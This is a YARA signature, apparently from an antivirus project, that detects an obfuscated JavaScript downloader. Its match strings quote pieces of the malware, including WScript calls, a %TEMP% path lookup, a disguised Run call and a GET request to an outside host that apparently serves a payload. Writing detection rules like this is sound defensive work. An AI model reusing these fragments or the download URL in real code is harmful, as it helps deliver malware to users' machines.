rule sig_20160428_88491898417897bcbf9bd60131950d86 {
  meta:
    description = "datamaliciousorder - file 20160428_88491898417897bcbf9bd60131950d86.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "67824246ab1780367de068064563aa8b4c897248d0386fb03ea3836823b45099"

  strings:
    $s1  = "function WukWarJzbVfzVciHzzFce() {return NniWncYzgOemPktXevUkn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function UcfYcoOdmPyoOtcVohVxm(CqiVaeJnaWycZwlIbxApq){NniWncYzgOemPktXevUkn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function UcfYcoOdmPyoOtcVohVxm(CqiVaeJnaWycZwlIbxApq){NniWncYzgOemPktXevUkn[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function ZxvVvrYndAhlMtuBmoThr(FxcJrtZauSbdPifLzqBjz, AcpNgmWfjNzhGymHaoPjl){TjwNxhQguTmbSjwEkpEdp = TjwNxhQguTmbSjwEkpEdp * 1; " ascii
    $s5  = "var NniWncYzgOemPktXevUkn = function UxrYkmWslQalUtlGugHfh() {return KguPdrJaoMxpMqfAegUuq[BiqXotJrqTotYimKdvPta](\"WScript\"+\"" ascii
    $s6  = "return FxcJrtZauSbdPifLzqBjz - AcpNgmWfjNzhGymHaoPjl;};" fullword ascii
    $s7  = "UrpNfhUwyFgkBjsZwwBwn[YjiMrsGjtLmmOwxLvqIbz](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s8  = "var NniWncYzgOemPktXevUkn = function UxrYkmWslQalUtlGugHfh() {return KguPdrJaoMxpMqfAegUuq[BiqXotJrqTotYimKdvPta](\"WScript\"+\"" ascii
    $s9  = "var KguPdrJaoMxpMqfAegUuq = this[\"WScript\"];" fullword ascii
    $s10 = "function WukWarJzbVfzVciHzzFce() {return NniWncYzgOemPktXevUkn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (UrpNfhUwyFgkBjsZwwBwn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function ZxvVvrYndAhlMtuBmoThr(FxcJrtZauSbdPifLzqBjz, AcpNgmWfjNzhGymHaoPjl){TjwNxhQguTmbSjwEkpEdp = TjwNxhQguTmbSjwEkpEdp * 1; " ascii
    $s13 = "function GffMnuUfpTkoOmcWwmBzl(){return WptFqmOppMivSifXhtPyu + \"\";};" fullword ascii
    $s14 = "function OigYypTdbQqoWqfMvlYoy() {return ((SolHikCrcQdjJwmQkcCnd == true) && (SolHikCrcQdjJwmQkcCnd == KzuBmjCzlVouSlpWrnLdx)) ?" ascii
    $s15 = "function OigYypTdbQqoWqfMvlYoy() {return ((SolHikCrcQdjJwmQkcCnd == true) && (SolHikCrcQdjJwmQkcCnd == KzuBmjCzlVouSlpWrnLdx)) ?" ascii
    $s16 = "function PxsVdzTbzIueRlmZbcSsw(OvrArhIjlOymJqsJveZmj) {var IevKssHehZoeExxWbvGzv = (1, 2, 3, 4, 5, OvrArhIjlOymJqsJveZmj); retur" ascii
    $s17 = "}while (XanGirJrvInwCpvWkzNqk);" fullword ascii
    $s18 = "var KqiHneJccLtgEpcQbgQlu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var KzuBmjCzlVouSlpWrnLdx = false;" fullword ascii
    $s20 = "function UkhZqjXmaGmvHfdZcxPmz()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}